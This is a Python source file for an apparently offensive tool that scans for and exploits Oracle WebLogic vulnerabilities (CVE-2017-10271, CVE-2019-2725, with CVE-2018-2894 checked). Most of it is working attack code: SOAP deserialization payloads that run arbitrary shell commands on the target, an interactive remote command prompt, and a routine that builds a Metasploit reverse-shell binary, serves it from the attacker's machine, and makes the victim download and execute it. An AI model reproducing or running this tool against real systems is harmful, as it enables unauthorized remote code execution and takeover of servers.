#!/usr/bin/python3
#written by Ian Powers
#attempt to enumerate and exploit several known weblogic CVE's

#TODO
#CVE-2015-4852 (Deserialization RCE)
#CVE-2016-3510 (Deserialization RCE)
#CVE-2017-3248 
#CVE-2018-2628 (Deserialization RCE)
#CVE-2018-2893 (Deserialization RCE)
#CVE-2020-2883
#CVE-2020-2555 (Deserialization RCE)
#CVE-2020-14882
#check /console/login/LoginForm.jsp or /consolehelp/console-help.portal if exists for version number (under footerVersion)
#check for default creds on same portal

#IMPORT FILES
from argparse import ArgumentParser #for command line arguments
import socket                       #for port scanning
import sys                          #for responding to if someone presses ctrl+c
import requests                     #for making web requests
import threading                    #for starting threads
from threading import Thread        #imported thread class so a custom one isn't necessary
import os                           #for detecting if script is being run as root
import random                       #for generating random numbers for ping lengths
import subprocess                   #for launching metasploit functionality
import shlex                        #for splitting command line arguments for easier handling of subprocesses
import http.server                  #for hosting payloads
import socketserver                 #for hosting payloads
import time

#class for handling CVE's
class KnownVuln:
    def __init__(self, cve, description, interactiveShell, MSShell, commandEx, pingValidate, uriPath):
        self.cve = cve
        self.description = description
        self.interactiveShell = interactiveShell
        self.MSShell = MSShell
        self.commandEx = commandEx
        self.pingValidate = pingValidate
        self.uriPath = uriPath

    def checkVuln(self,exploit):
        if exploit.verbose:
            print("[#] Checking if target is potentially vulnerable to "+self.cve)
        try:
            response = requests.get(exploit.http+"://"+exploit.target+":"+str(exploit.targetPort)+self.uriPath)
            if response.status_code == 200:
                if exploit.verbose:
                    print("[$] Host appears vulnerable to",self.cve)
                return True
            else:
                if exploit.verbose:
                    print("[X] Host does not appear to be vulnerable to",self.cve)
                return False
        except Exception as error:
            print("[X] Connection error to "+exploit.http+"://"+exploit.target+":"+str(exploit.targetPort)+self.uriPath)
            if exploit.verbose:
                print(error)
            return False
    #end def checkVuln

    def canInteractiveShell(self):
        return self.interactiveShell
        
    def canMSShell(self):
        return self.MSShell

    def canCmdEx(self):
        return self.commandEx

    def canPingValidate(self):
        return self.pingValidate

    def getTitle(self):
        return self.cve

    def getDescription(self):
        return self.description

    def getPath(self):
        return self.uriPath

#define vulnerabilities
cve201710271 = KnownVuln("CVE-2017-10271","Deserialization RCE by POSTing to WLS WSAT component",False,True,True,True, "/wls-wsat/CoordinatorPortType")
cve20182894 = KnownVuln("CVE-2018-2894","Unrestricted File Upload to RCE",False,False,False,False,"/ws_utc/resources/setting/options/general")
cve20192725 = KnownVuln("CVE-2019-2725","Deserialization RCE by POSTing to _async component",False,True,True,True,"/_async/AsyncResponseService")
cves = [cve201710271, cve20182894, cve20192725]

#main exploit class
class Exploit:

    def __init__(self,target, targetPort, localhost, localPort, secure, verbose):
        self.target = target
        self.targetPort = targetPort
        self.localhost = localhost
        self.localPort = localPort
        self.verbose = verbose
        self.isWin = False
        self.isNix = False
        self.winShellBin = "cmd"
        self.winCmdFlag = "/c"
        self.nixShellBin = "/bin/sh"
        self.nixCmdFlag = "-c"
        self.pingLength = 0
        self.webPort = 8000
        if secure:
            self.http = "https"
        else:
            self.http="http"
        self.headers = {
            "Content-Type":
            "text/xml",
            "User-Agent":
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0"
        }
    #end def __init__

    def exploitMenu(self,cve):
        print("[?] Select an option for the exploit:")
        validOption = False
        menuOptions=[]
        menuChoice = 0
        if cve.canInteractiveShell():
            print("\t["+str(menuChoice)+"]: Interactive Shell (Linux only)")
            menuChoice += 1
            menuOptions.append("intShell")
            validOption = True
        if cve.canMSShell():
            #ms shell is only supported for linux at the moments
            if self.isNix:
                print("\t["+str(menuChoice)+"]: MetaSploit Shell")
                menuChoice += 1
                menuOptions.append("msShell")
                validOption = True
        if cve.canCmdEx():
            print("\t["+str(menuChoice)+"]: Run individual commands")
            menuChoice += 1
            menuOptions.append("runCmd")
            validOption = True
        if cve.canPingValidate():
            print("\t["+str(menuChoice)+"]: Validate RCE with ping")
            menuChoice += 1
            menuOptions.append("pingValidate")
            validOption = True
        print("\t["+str(menuChoice)+"]: Back to CVE Menu")
        menuOptions.append("back")

        validInput = False
        while not validInput:
            userInput = input("Enter selection: ")
            try:
                int(userInput)
                if 0 <= int(userInput) <= len(menuOptions):
                    validKey=True
                    return menuOptions[int(userInput)]
            except:
                print("[X] Please enter the number to the left of the selection you wish to make")
    #end def exploitMenu

    def exploitVuln(self,cve):
        menuSelect = self.exploitMenu(cve)
        #create interactive shell
        if menuSelect == "intShell":
            print("[&] WIP")

        #run metasploit shell
        elif menuSelect == "msShell":
            if self.verbose:
                print("[#] Creating msfvenom payload")
            msfvenomCmd = "msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp lhost="+self.localhost+" lport="+self.localPort+" -f elf -o webFlawgicShell.elf"
            args = shlex.split(msfvenomCmd)
            subprocess.run(args)
            msfconsoleCmd = 'msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x86/meterpreter/reverse_tcp;set LHOST '+self.localhost+';set LPORT '+self.localPort+';run -j"'
            args = shlex.split(msfconsoleCmd)
            webThread = Thread(target = self.hostPayload)
            webThread.start()
            #sleep briefly so that web server is hosting
            time.sleep(10)
            wgetCMD = "wget http://"+self.localhost+":"+str(self.webPort)+"/webFlawgicShell.elf -O /tmp/pentest.elf"
            self.postCMD(wgetCMD,cve.getTitle())
            #prevents the reset of the exploit commands from running until the webserver is closed
            webThread.join()
            self.postCMD("chmod +x /tmp/pentest.elf",cve.getTitle())
            self.postCMD("/bin/bash -c '/tmp/pentest.elf'",cve.getTitle())
            if self.verbose:
                print("[#] Launching Metasploit listener")
            msProcess = subprocess.run(args)
            if self.verbose:
                print("[#] Deleting shell from victim")
            self.postCMD("rm /tmp/pentest.elf", cve.getTitle())
            
        #run single commands
        elif menuSelect == "runCmd":
            cmdExit = False
            while not cmdExit:
                cmd = input("[?] Enter command to be executed on target host (or type exit): ")
                if cmd.upper() == "EXIT":
                    cmdExit = True
                else:
                    self.postCMD(cmd,cve.getTitle())
        elif menuSelect == "pingValidate":
            try:
                #pingListenThread = self.pingThread(1, "Ping listener thread", 1)
                pingListenThread = Thread(target = self.pingListen)
                pingListenThread.start()
                if self.verbose:
                    print("[#] Submitting ping payload")
                    #ping will be set to a random size between 1 and 10
                    self.pingLength = random.randint(1,11)
                if self.isWin:
                    pingCmd = "ping -n 1 -l "+ str(self.pingLength) + " " + self.localhost
                if self.isNix:
                    pingCmd = "ping -c 1 -s "+ str(self.pingLength) + " " + self.localhost
                self.postCMD(pingCmd, cve.getTitle())
                pingListenThread.join()
            except Exception as error:
                print("[X] Unable to spawn thread to start ping listener")
                print(error)
    #end def exploitVuln

    def hostPayload(self):
        webHandler = http.server.SimpleHTTPRequestHandler
        with socketserver.TCPServer(("", self.webPort), webHandler) as httpd:
            if self.verbose:
                print("[#] Starting webserver on port",self.webPort,"to host payload")
            httpd.handle_request()
            if self.verbose:
                print("[#] Received request, terminating web server")
            httpd.server_close()            
    #end def hostPayload

    def pingListen(self):
        pingReturned = True
        if self.verbose:
            print("[#] Listening for pings")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            s.settimeout(10)
            try:   
                #receive packet data
                packet = s.recvfrom(65565)
                #subtract 28 from packet length, pings set to a size of zero have a length of 28
                receivedPingLength = len(packet[0]) - 28
            except:
                print("[X] No pings received, socket timed out")
                pingReturned = False
            try:
                s.close()
                if self.verbose:
                    print("[#] Closing ping listener")
            except socket.error as msg:
                print("[X] Socket could not be closed. Error Code: " + str(msg[0]) + " Message: " + msg[1])
            #if a ping was received by the listener and that ping was the same size as the random payload submitted
            if pingReturned and receivedPingLength==self.pingLength:
                print("[$] Ping received, RCE successful!")
            elif pingReturned:
                print("[X] Ping received, but was not the expected size of the payload sent. Something else might be pinging your host right now.")
        except socket.error as msg:
            print("[X] Socket could not be created. Error Code: " + str(msg[0]) + " Message: " + msg[1])

    def portscan(self,port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((self.target, port))
            if result == 0:
                return True
            else:
                return False
            sock.close()
        except socket.error as msg:
            print("[X] Socket could not be created. Error Code: " + str(msg[0]) + "Error Message: " + msg[1])
            return False
    #end def portscan

    def postCMD(self,cmd, cve):
        if self.isWin:
            shellBin = self.winShellBin
            cmdFlag = self.winCmdFlag
        if self.isNix:
            shellBin = self.nixShellBin
            cmdFlag = self.nixCmdFlag

        if cve == "CVE-2017-10271":
            path = "/wls-wsat/CoordinatorPortType"
            data = """<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
          <soapenv:Header>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
              <java>
                <void class="java.lang.ProcessBuilder">
                  <array class="java.lang.String" length="3" >
                    <void index="0">
                      <string>"""+shellBin+"""</string>
                    </void>
                    <void index="1">
                      <string>"""+cmdFlag+"""</string>
                    </void>
                    <void index="2">
                      <string>"""+cmd+"""</string>
                    </void>
                  </array>
                  <void method="start"/>
                </void>
              </java>
            </work:WorkContext>
          </soapenv:Header>
          <soapenv:Body/>
        </soapenv:Envelope>"""
        #end if cve == "CVE-2017-10271"

        elif cve == "CVE-2019-2725":
            path = "/_async/AsyncResponseService"
            data = """<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
            <soapenv:Header> 
                <wsa:Action>xx</wsa:Action>
                <wsa:RelatesTo>xx</wsa:RelatesTo>
                <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                    <void class="java.lang.ProcessBuilder">
                        <array class="java.lang.String" length="3">
                            <void index="0">
                                <string>"""+shellBin+"""</string>
                            </void>
                            <void index="1">
                                <string>"""+cmdFlag+"""</string>
                            </void>
                            <void index="2">
                                <string>"""+cmd+"""</string>
                            </void>
                        </array>
                    <void method="start"/></void>
                </work:WorkContext>
            </soapenv:Header>
            <soapenv:Body>
                <asy:onAsyncDelivery/>
            </soapenv:Body></soapenv:Envelope>"""
        #end if cve == "CVE-2019-2725"
            
        url = self.http+"://"+self.target+":"+str(self.targetPort)+path
        if self.verbose:
            print("[#] Submitting command: "+cmd+" to "+url)
        try:
            response = requests.post(url, data=data, headers=self.headers, timeout=10, verify=False)
        except Exception as error:
            print("[X] Connection error to "+url)
            if self.verbose:
                print(error)
    #end def postCMD

    def splash(self):
        print("""$$\      $$\           $$\       $$$$$$$$\ $$\                                   $$\           
$$ | $\  $$ |          $$ |      $$  _____|$$ |                                  \__|          
$$ |$$$\ $$ | $$$$$$\  $$$$$$$\  $$ |      $$ | $$$$$$\  $$\  $$\  $$\  $$$$$$\  $$\  $$$$$$$\ 
$$ $$ $$\$$ |$$  __$$\ $$  __$$\ $$$$$\    $$ | \____$$\ $$ | $$ | $$ |$$  __$$\ $$ |$$  _____|
$$$$  _$$$$ |$$$$$$$$ |$$ |  $$ |$$  __|   $$ | $$$$$$$ |$$ | $$ | $$ |$$ /  $$ |$$ |$$ /      
$$$  / \$$$ |$$   ____|$$ |  $$ |$$ |      $$ |$$  __$$ |$$ | $$ | $$ |$$ |  $$ |$$ |$$ |      
$$  /   \$$ |\$$$$$$$\ $$$$$$$  |$$ |      $$ |\$$$$$$$ |\$$$$$\$$$$  |\$$$$$$$ |$$ |\$$$$$$$\ 
\__/     \__| \_______|\_______/ \__|      \__| \_______| \_____\____/  \____$$ |\__| \_______|
                                                                       $$\   $$ |              
                                                                       \$$$$$$  |              
                                                                        \______/               """)
    #end def splash

    def run(self):
        #print splash
        self.splash()

        if not os.getuid(): #check to make sure script is running as root

            try:
                #determine if host is windows or linux
                print("[#] Attempting to determine if host is Windows or Linux")
                #scan port 22 as a guess to see if host is Linux
                if self.portscan(22):
                    print("[$] Target host appears to be running on Linux")
                    self.isNix = True
                #scan port 445 as a guess to see if the host is Windows
                if self.portscan(445):
                    print("[$] Target host appears to be running on Windows")
                    self.isWin = True
                    
                #if neither ports seemed to be open, prompt the user to input OS type or if the host has both port 22 and 445 open
                if (not (self.isNix or self.isWin)) or (self.isNix and self.isWin):
                    print("[X] Unable to determine OS type automatically")
                    correctAnswer = False
                    while not correctAnswer:
                        osInput = input("[?] Is the target host running on Windows or Linux? ")
                        if osInput.upper() == "WIN" or osInput.upper() == "WINDOWS":
                            print("[#] Proceeding assuming the target host is a Windows box")
                            self.isWin = True
                            self.isNix = False
                            correctAnswer = True                        
                        elif osInput.upper() == "LINUX" or osInput.upper() =="NIX":
                            print("[#] Proceeding assuming the target host is a Linux box")
                            self.isNix = True
                            self.isWin = False
                            correctAnswer = True
                        elif osInput.upper() == "NO" or osInput.upper() == "YES" or osInput.upper() == "TRUE" or osInput.upper == "FALSE":
                            print("[X] That was not a yes or no question...")
                        else:
                            #if not correctAnswer:
                            print("[X] Unexpected input, please enter Windows or Linux")

                #determine the version of weblogic that is running
                path = "/console/login/LoginForm.jsp"
                url = self.http+"://"+self.target+":"+str(self.targetPort)+path
                response = requests.get(url)
                
                #determine which cve's are potentially exploitable
                print("[#] Enumerating potential vulnerabilities...")
                exploitableCVEs = []
                for cve in cves:
                    if cve.checkVuln(self):
                        exploitableCVEs.append(cve)
                
                #give user option of which CVE to attempt to exploit if any were discovered
                exploiting = True
                
                if len(exploitableCVEs) > 0: 
                    while exploiting:
                        #display options to user
                        print("[?] Which CVE do you want to try to exploit?")
                        cveKey = 0
                        for cve in exploitableCVEs:
                            print("\t["+str(cveKey)+"] "+ cve.getTitle() + " : " + cve.getDescription())
                            cveKey+=1
                        print("\t["+str(cveKey)+"] Exit")

                        validKey = False
                        while not validKey:
                            userSelect = input("Enter selection: ")
                            #if the key entered is in between 0 and the largest selectable CVE
                            try:
                                int(userSelect)
                                if 0 <= int(userSelect) <= len(exploitableCVEs):
                                    validKey=True
                            except:
                                print("[X] Please enter the number to the left of the CVE you wish to exploit")

                        if int(userSelect) == len(exploitableCVEs):
                            exploiting = False
                            print("[X] Exiting...")

                        else:
                            #attempt to exploit the provided CVE
                            self.exploitVuln(exploitableCVEs[int(userSelect)])
                        
                else:
                    print("[X] Did not discover any potential vulnerabilities")

            except KeyboardInterrupt:
                print("\n[X] I guess I'll die now (you pressed ctrl+c)")
                sys.exit()
        else:
            print("[X] Script must be run as sudo to work correctly")
    #end def run
   
           
#argument parser
if __name__=="__main__":
    parser = ArgumentParser(
        description = "Enumerates and exploits several known Oracle Weblogic CVE's such as:CVE-2017-10271, CVE-2018-2894, and CVE-2019-2725"
    )

    parser.add_argument(
        '-t',
        '--target',
        required=True,
        dest='target',
        nargs='?',
        help='The target host to run script against'
    )#add argument target

    parser.add_argument(
        '-p',
        '--target-port',
        dest='targetPort',
        default=7001,
        nargs='?',
        help='Target port that Weblogic is being hosted on (default is 7001)'
    )#add argument targetPort

    parser.add_argument(
        '-l',
        '--localhost',
        dest='localhost',
        required=True,
        nargs='?',
        help='Local host that will catch shells'
    )#add argument localhost

    parser.add_argument(
        '-lp',
        '--localPort',
        dest='localPort',
        default='6666',
        nargs='?',
        help='Local port that will catch shells'
    )#add argument localPort

    parser.add_argument(
        '-s',
        '--secure',
        dest='secure',
        action='store_true'
    )#add argument secure

    parser.add_argument(
        '-v',
        '--verbose',
        dest='verbose',
        action='store_true'
    )#add argument verbose

    args = parser.parse_args()

    exploit=Exploit(target=args.target, targetPort = args.targetPort, localhost = args.localhost, localPort=args.localPort, secure = args.secure, verbose = args.verbose)
    exploit.run()
